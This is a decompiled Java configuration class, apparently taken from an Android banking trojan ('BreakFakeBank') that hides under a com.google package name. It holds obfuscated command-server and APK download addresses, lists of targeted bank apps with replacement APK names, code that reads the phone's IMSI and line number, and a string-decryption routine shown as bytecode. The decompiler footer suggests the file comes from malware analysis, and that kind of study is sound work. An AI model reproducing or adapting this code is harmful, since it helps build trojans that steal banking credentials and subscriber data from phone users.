package com.google.bps.bfcfc;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.telephony.TelephonyManager;
import java.io.File;
import java.io.FileInputStream;
import java.util.List;

public class Config {
  public static String APK_URL;
  
  private static final int CMNET = 3;
  
  private static final int CMWAP = 2;
  
  public static String SERVER_ADDRESS;
  
  public static String SERVER_HOST = getSDPath("==8yMXxsYyJ4cWdweF8/anBvd3t1QkUBtFO9MweS");
  
  public static String URL;
  
  private static final int WIFI = 1;
  
  public static String[] apkNames;
  
  public static String[] bName;
  
  public static String[] bank;
  
  public static String[] bankName;
  
  public static String cBankStr;
  
  public static String delPackage;
  
  public static String downApk;
  
  public static int[] icon;
  
  public static File installApk;
  
  public static int isAlert;
  
  public static String number;
  
  public static String sBankStr;
  
  public static String[] upbank;
  
  static {
    SERVER_ADDRESS = getSDPath("==zI3oTfyI+bx5js3Onb1pc1MgGawZG7NA0t");
    APK_URL = String.valueOf(SERVER_HOST) + getSDPath("U=POyZI2MwE8kTdmOzxe");
    URL = String.valueOf(SERVER_HOST) + SERVER_ADDRESS;
    number = "";
    delPackage = "";
    installApk = null;
    downApk = "";
    bank = new String[] { getSDPath("==12LDU8IHlDMAFRcTMlNAYS"), getSDPath("==AvazEvIXkkIyNrNwp0MSksLCBCQQF0abkwNAdj"), getSDPath("Q=iX05Kens6Wm5uW0rXPjNSekp6ewZGW25yStN+Ik5nUl5HBlZSXnJK7MjIBSGbasTzo"), getSDPath("Q=Sr77GmrvCptaHvt4P+qa+jp62nM0UBicS9Zj8r"), getSDPath("ozb5vf/z7bX75rX48Nyi5/84QwEjuXoO") };
    upbank = new String[] { getSDPath("==NMCE9MRVpaWFtfV0Q3ATcnZVbJNQFV"), getSDPath("80Tbn8Xb1c3Nz8zIwDZFAWRwdWgs"), getSDPath("==E+ejs3N2dzJiUhLAlDOQG6IMuoNAZy"), getSDPath("==LNidfXw9vb2dre1jU4Abm6z1Q/NQlN"), getSDPath("M=Wa3pyQjoyMjo2JgTJEAXBKejw4") };
    bankName = new String[] { getSDPath("A1iuRDkBvS7YI5n7"), getSDPath("==vNOTMBq4KdMw1v"), getSDPath("Q=kZNzcBns85uTOw"), getSDPath("==LVOUIB0E11Mw3u"), "K" };
    apkNames = new String[] { getSDPath("==L/8Pzwxauw8+zkODgB0lghMwoO"), getSDPath("==o3ODQ4DX54OyQsQzABWEekMwaC"), getSDPath("Q=G8s7+zhu7zsK+nNDkBmZjHND46"), getSDPath("==v2+fX5zLu5+uXtN0YBRKxaMwqe"), getSDPath("==Dt4u7i17yi4f72N0EBSFa/Mwsv") };
    bName = new String[] { getSDPath("U=qUyfqX95NBNQFpXkWRpzZi"), getSDPath("M=wKQD8z8xQVL0gsADUyAdaQwDET"), getSDPath("Q=xMOFZJkKGYtbW4NEMBrNxtmDbl"), getSDPath("==vNt9nou7HLt+LGt+qyQzMBdLc+Mw5t"), getSDPath("==m62/K+34Oz59y80sVDRQGJN5apNASg") };
    icon = new int[] { 2130837507, 2130837508, 2130837504, 2130837509, 2130837506 };
    cBankStr = "";
    sBankStr = "";
    isAlert = 0;
  }
  
  public static String configPath() {
    return String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + getSDPath("I1AJOQZACAcBOTYBhGaTvTQB");
  }
  
  public static int get(Context paramContext, String paramString, int paramInt) {
    return paramContext.getSharedPreferences("config", 0).getInt(paramString, paramInt);
  }
  
  public static String get(Context paramContext, String paramString1, String paramString2) {
    return paramContext.getSharedPreferences("config", 0).getString(paramString1, paramString2);
  }
  
  @SuppressLint({"DefaultLocale"})
  public static int getAPNType(Context paramContext) {
    byte b = -1;
    NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService(getSDPath("k16mi5qChKyiv6KhNDABXXaDPEt6"))).getActiveNetworkInfo();
    if (networkInfo == null)
      return -1; 
    int i = networkInfo.getType();
    System.out.println(getSDPath("==K6lJaVnYq8tr/wtryssaqzvIKwiZCs+vnwt6L5NDYBxow2MwvK") + networkInfo.getExtraInfo());
    if (i == 0)
      return networkInfo.getExtraInfo().toLowerCase().equals(getSDPath("==kzFR5CMwGI04/eNAIj")) ? 3 : 2; 
    if (i == 1)
      b = 1; 
    return b;
  }
  
  public static long getFileSizes(File paramFile) throws Exception {
    long l = 0L;
    if (paramFile.exists())
      return (new FileInputStream(paramFile)).available(); 
    paramFile.createNewFile();
    System.out.println(getSDPath("U1QKeh8kfyY8Zj8IdQI5ODYB0IsuK9Yg"));
    return l;
  }
  
  public static String getIMSI(Context paramContext) {
    String str;
    try {
      str = ((TelephonyManager)paramContext.getSystemService(getSDPath("==bv6tw1QwFPL6E6NA9P"))).getSubscriberId().trim();
    } catch (Exception exception) {
      str = "";
    } 
    return str;
  }
  
  public static String getPhoneNumber(Context paramContext) {
    String str;
    try {
      str = ((TelephonyManager)paramContext.getSystemService(getSDPath("IzHx/+w4QgHUrt/v"))).getLine1Number().trim();
    } catch (Exception exception) {
      str = "";
    } 
    return str;
  }
  
  public static String getSDPath() {
    File file = null;
    if (Environment.getExternalStorageState().equals(getSDPath("M=4xGxUTNUI0AcSbtDID")))
      file = Environment.getExternalStorageDirectory(); 
    return file.toString();
  }
  
  private static String getSDPath(String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: bipush #19
    //   4: newarray byte
    //   6: astore_2
    //   7: aload_2
    //   8: dup
    //   9: iconst_0
    //   10: ldc_w -5
    //   13: bastore
    //   14: dup
    //   15: iconst_1
    //   16: ldc_w -12
    //   19: bastore
    //   20: dup
    //   21: iconst_2
    //   22: ldc_w -2
    //   25: bastore
    //   26: dup
    //   27: iconst_3
    //   28: ldc_w -24
    //   31: bastore
    //   32: dup
    //   33: iconst_4
    //   34: ldc_w -11
    //   37: bastore
    //   38: dup
    //   39: iconst_5
    //   40: ldc_w -13
    //   43: bastore
    //   44: dup
    //   45: bipush #6
    //   47: ldc_w -2
    //   50: bastore
    //   51: dup
    //   52: bipush #7
    //   54: ldc_w -76
    //   57: bastore
    //   58: dup
    //   59: bipush #8
    //   61: ldc_w -17
    //   64: bastore
    //   65: dup
    //   66: bipush #9
    //   68: ldc_w -18
    //   71: bastore
    //   72: dup
    //   73: bipush #10
    //   75: ldc_w -13
    //   78: bastore
    //   79: dup
    //   80: bipush #11
    //   82: ldc_w -10
    //   85: bastore
    //   86: dup
    //   87: bipush #12
    //   89: ldc_w -76
    //   92: bastore
    //   93: dup
    //   94: bipush #13
    //   96: ldc_w -40
    //   99: bastore
    //   100: dup
    //   101: bipush #14
    //   103: ldc_w -5
    //   106: bastore
    //   107: dup
    //   108: bipush #15
    //   110: ldc_w -23
    //   113: bastore
    //   114: dup
    //   115: bipush #16
    //   117: ldc_w -1
    //   120: bastore
    //   121: dup
    //   122: bipush #17
    //   124: ldc_w -84
    //   127: bastore
    //   128: dup
    //   129: bipush #18
    //   131: ldc_w -82
    //   134: bastore
    //   135: pop
    //   136: aload_0
    //   137: iconst_0
    //   138: iconst_2
    //   139: invokevirtual substring : (II)Ljava/lang/String;
    //   142: astore_3
    //   143: new java/lang/StringBuilder
    //   146: dup
    //   147: aload_0
    //   148: aload_0
    //   149: invokevirtual length : ()I
    //   152: iconst_2
    //   153: isub
    //   154: invokevirtual substring : (I)Ljava/lang/String;
    //   157: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   160: invokespecial <init> : (Ljava/lang/String;)V
    //   163: aload_0
    //   164: iconst_2
    //   165: aload_0
    //   166: invokevirtual length : ()I
    //   169: iconst_2
    //   170: isub
    //   171: invokevirtual substring : (II)Ljava/lang/String;
    //   174: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   177: aload_3
    //   178: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   181: invokevirtual toString : ()Ljava/lang/String;
    //   184: astore_0
    //   185: iconst_0
    //   186: istore #4
    //   188: iload #4
    //   190: bipush #19
    //   192: if_icmplt -> 604
    //   195: new java/lang/String
    //   198: dup
    //   199: aload_2
    //   200: invokespecial <init> : ([B)V
    //   203: astore_3
    //   204: new java/lang/StringBuilder
    //   207: dup
    //   208: aload_3
    //   209: iconst_2
    //   210: iconst_3
    //   211: invokevirtual substring : (II)Ljava/lang/String;
    //   214: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   217: invokespecial <init> : (Ljava/lang/String;)V
    //   220: aload_3
    //   221: bipush #16
    //   223: bipush #17
    //   225: invokevirtual substring : (II)Ljava/lang/String;
    //   228: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   231: invokevirtual toString : ()Ljava/lang/String;
    //   234: astore_2
    //   235: new java/lang/StringBuilder
    //   238: dup
    //   239: new java/lang/StringBuilder
    //   242: dup
    //   243: new java/lang/StringBuilder
    //   246: dup
    //   247: aload_2
    //   248: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   251: invokespecial <init> : (Ljava/lang/String;)V
    //   254: ldc_w 'c'
    //   257: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   260: invokevirtual toString : ()Ljava/lang/String;
    //   263: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   266: invokespecial <init> : (Ljava/lang/String;)V
    //   269: aload_3
    //   270: iconst_4
    //   271: iconst_5
    //   272: invokevirtual substring : (II)Ljava/lang/String;
    //   275: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   278: invokevirtual toString : ()Ljava/lang/String;
    //   281: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   284: invokespecial <init> : (Ljava/lang/String;)V
    //   287: aload_2
    //   288: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   291: invokevirtual toString : ()Ljava/lang/String;
    //   294: astore_2
    //   295: aload_3
    //   296: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   299: astore_3
    //   300: aload_3
    //   301: aload_2
    //   302: iconst_2
    //   303: anewarray java/lang/Class
    //   306: dup
    //   307: iconst_0
    //   308: ldc java/lang/String
    //   310: aastore
    //   311: dup
    //   312: iconst_1
    //   313: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
    //   316: aastore
    //   317: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   320: aload_3
    //   321: iconst_2
    //   322: anewarray java/lang/Object
    //   325: dup
    //   326: iconst_0
    //   327: aload_0
    //   328: aastore
    //   329: dup
    //   330: iconst_1
    //   331: iconst_0
    //   332: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   335: aastore
    //   336: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   339: checkcast [B
    //   342: astore_0
    //   343: aload_0
    //   344: arraylength
    //   345: istore #5
    //   347: iload #5
    //   349: iconst_1
    //   350: isub
    //   351: aload_0
    //   352: iload #5
    //   354: iconst_1
    //   355: isub
    //   356: baload
    //   357: i2c
    //   358: invokestatic valueOf : (C)Ljava/lang/String;
    //   361: invokestatic parseInt : (Ljava/lang/String;)I
    //   364: isub
    //   365: istore #6
    //   367: aload_0
    //   368: iload #6
    //   370: iconst_1
    //   371: isub
    //   372: baload
    //   373: iconst_1
    //   374: if_icmpne -> 673
    //   377: iconst_1
    //   378: istore #4
    //   380: iinc #6, -1
    //   383: aload_0
    //   384: iload #6
    //   386: iconst_2
    //   387: isub
    //   388: baload
    //   389: i2c
    //   390: istore #7
    //   392: aload_0
    //   393: iload #6
    //   395: iconst_1
    //   396: isub
    //   397: baload
    //   398: i2c
    //   399: istore #8
    //   401: new java/lang/StringBuilder
    //   404: dup
    //   405: iload #7
    //   407: invokestatic valueOf : (C)Ljava/lang/String;
    //   410: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   413: invokespecial <init> : (Ljava/lang/String;)V
    //   416: iload #8
    //   418: invokestatic valueOf : (C)Ljava/lang/String;
    //   421: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   424: invokevirtual toString : ()Ljava/lang/String;
    //   427: bipush #16
    //   429: invokestatic parseInt : (Ljava/lang/String;I)I
    //   432: i2b
    //   433: bipush #113
    //   435: iadd
    //   436: i2b
    //   437: istore #9
    //   439: iload #6
    //   441: iconst_2
    //   442: isub
    //   443: istore #10
    //   445: iconst_0
    //   446: istore #6
    //   448: iload #6
    //   450: iload #10
    //   452: if_icmplt -> 679
    //   455: iload #10
    //   457: istore #6
    //   459: iload #6
    //   461: iload #5
    //   463: if_icmplt -> 698
    //   466: iload #4
    //   468: iconst_1
    //   469: if_icmpne -> 580
    //   472: new java/lang/Exception
    //   475: dup
    //   476: invokespecial <init> : ()V
    //   479: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
    //   482: iconst_1
    //   483: aaload
    //   484: astore_3
    //   485: aload_3
    //   486: invokevirtual getClassName : ()Ljava/lang/String;
    //   489: astore_2
    //   490: aload_2
    //   491: ldc_w '.'
    //   494: invokevirtual lastIndexOf : (Ljava/lang/String;)I
    //   497: istore #4
    //   499: aload_2
    //   500: astore_1
    //   501: iload #4
    //   503: iconst_m1
    //   504: if_icmpeq -> 516
    //   507: aload_2
    //   508: iload #4
    //   510: iconst_1
    //   511: iadd
    //   512: invokevirtual substring : (I)Ljava/lang/String;
    //   515: astore_1
    //   516: aload_3
    //   517: invokevirtual getMethodName : ()Ljava/lang/String;
    //   520: astore_2
    //   521: new java/lang/StringBuilder
    //   524: dup
    //   525: aload_1
    //   526: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   529: invokespecial <init> : (Ljava/lang/String;)V
    //   532: aload_2
    //   533: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   536: invokevirtual toString : ()Ljava/lang/String;
    //   539: astore_2
    //   540: aload_2
    //   541: astore_1
    //   542: aload_2
    //   543: invokevirtual length : ()I
    //   546: sipush #256
    //   549: if_icmple -> 561
    //   552: aload_2
    //   553: iconst_0
    //   554: sipush #256
    //   557: invokevirtual substring : (II)Ljava/lang/String;
    //   560: astore_1
    //   561: aload_1
    //   562: invokevirtual length : ()I
    //   565: istore #4
    //   567: iconst_0
    //   568: istore #6
    //   570: iinc #4, -1
    //   573: iload #6
    //   575: iload #10
    //   577: if_icmplt -> 710
    //   580: iload #10
    //   582: newarray byte
    //   584: astore_1
    //   585: iconst_0
    //   586: istore #4
    //   588: iload #4
    //   590: iload #10
    //   592: if_icmplt -> 761
    //   595: new java/lang/String
    //   598: dup
    //   599: aload_1
    //   600: invokespecial <init> : ([B)V
    //   603: areturn
    //   604: aload_2
    //   605: iload #4
    //   607: aload_2
    //   608: iload #4
    //   610: baload
    //   611: bipush #-102
    //   613: ixor
    //   614: i2b
    //   615: i2b
    //   616: bastore
    //   617: iinc #4, 1
    //   620: goto -> 188
    //   623: astore_0
    //   624: aload_0
    //   625: invokevirtual printStackTrace : ()V
    //   628: aload_1
    //   629: astore_0
    //   630: goto -> 343
    //   633: astore_0
    //   634: aload_0
    //   635: invokevirtual printStackTrace : ()V
    //   638: aload_1
    //   639: astore_0
    //   640: goto -> 343
    //   643: astore_0
    //   644: aload_0
    //   645: invokevirtual printStackTrace : ()V
    //   648: aload_1
    //   649: astore_0
    //   650: goto -> 343
    //   653: astore_0
    //   654: aload_0
    //   655: invokevirtual printStackTrace : ()V
    //   658: aload_1
    //   659: astore_0
    //   660: goto -> 343
    //   663: astore_0
    //   664: aload_0
    //   665: invokevirtual printStackTrace : ()V
    //   668: aload_1
    //   669: astore_0
    //   670: goto -> 343
    //   673: iconst_0
    //   674: istore #4
    //   676: goto -> 380
    //   679: aload_0
    //   680: iload #6
    //   682: aload_0
    //   683: iload #6
    //   685: baload
    //   686: iload #9
    //   688: ixor
    //   689: i2b
    //   690: i2b
    //   691: bastore
    //   692: iinc #6, 1
    //   695: goto -> 448
    //   698: aload_0
    //   699: iload #6
    //   701: iconst_0
    //   702: i2b
    //   703: bastore
    //   704: iinc #6, 1
    //   707: goto -> 459
    //   710: aload_0
    //   711: iload #6
    //   713: baload
    //   714: istore #9
    //   716: iload #4
    //   718: iconst_1
    //   719: isub
    //   720: istore #5
    //   722: aload_0
    //   723: iload #6
    //   725: iload #9
    //   727: aload_1
    //   728: iload #4
    //   730: invokevirtual charAt : (I)C
    //   733: i2b
    //   734: ixor
    //   735: i2b
    //   736: i2b
    //   737: bastore
    //   738: iload #5
    //   740: istore #4
    //   742: iload #5
    //   744: ifge -> 755
    //   747: aload_1
    //   748: invokevirtual length : ()I
    //   751: iconst_1
    //   752: isub
    //   753: istore #4
    //   755: iinc #6, 1
    //   758: goto -> 573
    //   761: aload_1
    //   762: iload #4
    //   764: aload_0
    //   765: iload #4
    //   767: baload
    //   768: i2b
    //   769: bastore
    //   770: iinc #4, 1
    //   773: goto -> 588
    // Exception table:
    //   from	to	target	type
    //   295	343	623	java/lang/ClassNotFoundException
    //   295	343	633	java/lang/IllegalAccessException
    //   295	343	643	java/lang/NoSuchMethodException
    //   295	343	653	java/lang/IllegalArgumentException
    //   295	343	663	java/lang/reflect/InvocationTargetException
  }
  
  public static boolean isNetworkConnected(Context paramContext) {
    if (paramContext != null) {
      NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService(getSDPath("==YGERwRBhopHhoKQUIBe5VnMwGx"))).getActiveNetworkInfo();
      if (networkInfo != null)
        return networkInfo.isAvailable(); 
    } 
    return false;
  }
  
  public static boolean isServiceRunning(Context paramContext, String paramString) {
    boolean bool = false;
    List list = ((ActivityManager)paramContext.getSystemService(getSDPath("AzfH3cLG/MY2OQGnqO3N"))).getRunningServices(30);
    if (list.size() <= 0)
      return false; 
    byte b = 0;
    while (true) {
      if (b < list.size()) {
        if (((ActivityManager.RunningServiceInfo)list.get(b)).service.getClassName().equals(paramString))
          return true; 
        b++;
        continue;
      } 
      return bool;
    } 
  }
  
  public static void set(Context paramContext, String paramString, int paramInt) {
    SharedPreferences.Editor editor = paramContext.getSharedPreferences("config", 0).edit();
    editor.putInt(paramString, paramInt);
    editor.commit();
  }
  
  public static void set(Context paramContext, String paramString1, String paramString2) {
    SharedPreferences.Editor editor = paramContext.getSharedPreferences("config", 0).edit();
    editor.putString(paramString1, paramString2);
    editor.commit();
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/Config.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */